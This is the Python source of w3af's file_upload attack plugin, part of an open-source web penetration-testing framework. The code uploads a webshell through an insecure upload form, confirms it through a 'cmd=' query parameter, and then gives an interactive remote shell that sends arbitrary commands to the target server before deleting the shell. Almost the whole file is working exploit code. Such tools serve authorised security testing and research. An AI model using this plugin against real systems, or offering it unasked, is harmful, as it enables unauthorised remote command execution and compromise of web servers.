'''
file_upload.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import os.path
import tempfile

import core.controllers.outputManager as om

# options
from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList
from core.controllers.plugins.attack_plugin import AttackPlugin

import core.data.kb.knowledge_base as kb
import core.data.kb.vuln as vuln
from core.data.kb.exec_shell import exec_shell as exec_shell
from core.data.parsers.url import parse_qs

from core.controllers.w3afException import w3afException
import plugins.attack.payloads.shell_handler as shell_handler
from plugins.attack.payloads.decorators.exec_decorator import exec_debug


from core.controllers.misc.temp_dir import get_temp_dir


class file_upload(AttackPlugin):
    '''
    Exploit applications that allow unrestricted file uploads inside the webroot.
    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)
        
        # Internal variables
        self._path_name = ''
        self._file_name = ''
        
        # User configured variables ( for fastExploit )
        self._url = 'http://host.tld/'
        self._method = 'POST'
        self._data = ''
        self._fileVars = ''
        self._fileDest = ''

    def fastExploit( self ):
        '''
        Exploits a web app with file upload vuln.
        '''
        if self._url == '' or self._fileVars == '' or self._fileDest == '' :
            om.out.error('You have to configure the plugin parameters.')
        else:
            v = vuln.vuln()
            v.setPluginName(self.get_name())
            v.setURL( self._url )
            v.setMethod( self._method )
            v.set_dc( self._data )
            v['fileVars'] = self._fileVars
            v['fileDest'] = self._fileDest
            kb.kb.append( 'file_upload', 'file_upload', v )

    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'

    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
        
        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
        return 'os_commanding' in this method.
        '''                
        return 'file_upload'
                
    def _generate_shell( self, vuln_obj ):
        '''
        @param vuln_obj: The vuln to exploit.
        @return: True is a shell object based on the param vuln was created ok.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln( vuln_obj ):
            
            # Set shell parameters
            shell_obj = fuShell( vuln_obj )
            shell_obj.set_url_opener( self._uri_opener )
            shell_obj.setExploitURL( self._exploit )
            return shell_obj
        else:
            return None

    def _verify_vuln( self, vuln_obj ):
        '''
        This command verifies a vuln. This is really hard work! :P
        
        @param vuln_obj: The vuln to exploit.
        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as a vuln object
        url = vuln_obj.getURL()
        method = vuln_obj.get_method()
        exploit_dc = vuln_obj.get_dc()

        # Create a file that will be uploaded
        extension = url.getExtension()
        fname = self._create_file( extension )
        file_handler = open( fname , "r")
        
        #   If there are files,
        if 'fileVars' in vuln_obj:
            #
            #   Upload the file
            #
            for file_var_name in vuln_obj['fileVars']:
                # the [0] was added here to support repeated parameter names
                exploit_dc[file_var_name][0] = file_handler
            http_method = getattr( self._uri_opener,  method)
            response = http_method( vuln_obj.getURL() ,  exploit_dc )
            
            # Call the uploaded script with an empty value in cmd parameter
            # this will return the shell_handler.SHELL_IDENTIFIER if success
            dst = vuln_obj['fileDest']
            self._exploit = dst.getDomainPath().urlJoin( self._file_name )
            self._exploit.querystring = u'cmd='
            response = self._uri_opener.GET( self._exploit )
            
            # Clean-up
            file_handler.close()
            os.remove( self._path_name )
            
            if shell_handler.SHELL_IDENTIFIER in response.getBody():
                return True
        
        #   If we got here, there is nothing positive to report ;)
        return False
    
    def _create_file( self, extension ):
        '''
        Create a file with a webshell as content.
        
        @return: Name of the file that was created.
        '''
        # Get content
        file_content, real_extension = shell_handler.get_webshells( extension, forceExtension=True )[0]
        if extension == '':
            extension = real_extension

        # Open target
        temp_dir = get_temp_dir()
        low_level_fd, self._path_name = tempfile.mkstemp(prefix='w3af_', suffix='.' + extension, dir=temp_dir)
        file_handler = os.fdopen(low_level_fd, "w+b")
        
        # Write content to target
        file_handler.write(file_content)
        file_handler.close()
        
        _path, self._file_name = os.path.split(self._path_name)
        return self._path_name
    
    def get_options( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fastExploit()'
        o1 = opt_factory('url', self._url, d1, 'url')
        
        d2 = 'Method to use with fastExploit()'
        o2 = opt_factory('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = opt_factory('data', self._data, d3, 'string')

        d4 = 'The variable in data that holds the file content. Only used in fastExploit()'
        o4 = opt_factory('fileVars', self._fileVars, d4, 'string')

        d5 = 'The URI of the uploaded file. Only used with fastExploit()'
        o5 = opt_factory('fileDest', self._fileDest, d5, 'string')
        
        ol = OptionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol

    def set_options( self, options_list ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of get_options().
        
        @param OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._url = options_list['url'].get_value()
        self._method = options_list['method'].get_value()
        self._data = parse_qs( options_list['data'].get_value() )
        self._fileVars = options_list['fileVars'].get_value()
        self._fileDest = options_list['fileDest'].get_value()

    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8
        
    def get_long_desc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits insecure file uploads and returns a shell. It's rather simple, using a form
        the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.
        
        No configurable parameters exist.
        '''

class fuShell(exec_shell):
    def setExploitURL( self, eu ):
        self._exploit = eu
    
    def getExploitURL( self ):
        return self._exploit
    
    @exec_debug
    def execute( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @param command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        to_send = self.getExploitURL()
        to_send.querystring = u'cmd=' + command
        response = self._uri_opener.GET( to_send )
        return response.getBody()
        
    def end( self ):
        om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
        file_to_del = self.getExploitURL().getFileName()
        try:
            self.unlink(file_to_del)
        except w3afException, e:
            om.out.error('File upload shell cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('File upload shell cleanup complete; successfully removed file: "' + file_to_del + '"')
    
    def get_name( self ):
        return 'file_upload'
